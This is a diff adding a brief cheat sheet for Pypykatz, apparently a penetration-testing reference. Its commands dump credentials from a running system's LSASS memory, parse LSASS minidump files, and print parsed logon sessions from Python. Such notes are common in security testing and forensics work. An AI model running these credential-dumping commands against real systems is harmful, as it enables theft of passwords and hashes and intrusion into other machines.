@@ -1,0 +1,13 @@
+==============================
+Pypykatz
+==============================
+
+# Python reimplementation of Mimikatz, useful for parsing LSASS dumps
+
+pypykatz live lsa                          # Dumps credentials from the currently running system's memory
+pypykatz parse minidump lsass.dmp          # Parses an LSASS minidump file and extracts credentials
+pypykatz live lsa -o json                  # Dumps credentials in JSON format (useful for scripting)
+# In Python:
+from pypykatz.pypykatz import pypykatz     # Import library
+katz = pypykatz.parse_minidump_file("lsass.dmp")  # Parse LSASS dump
+print(katz.logon_sessions)                 # Print parsed credentials
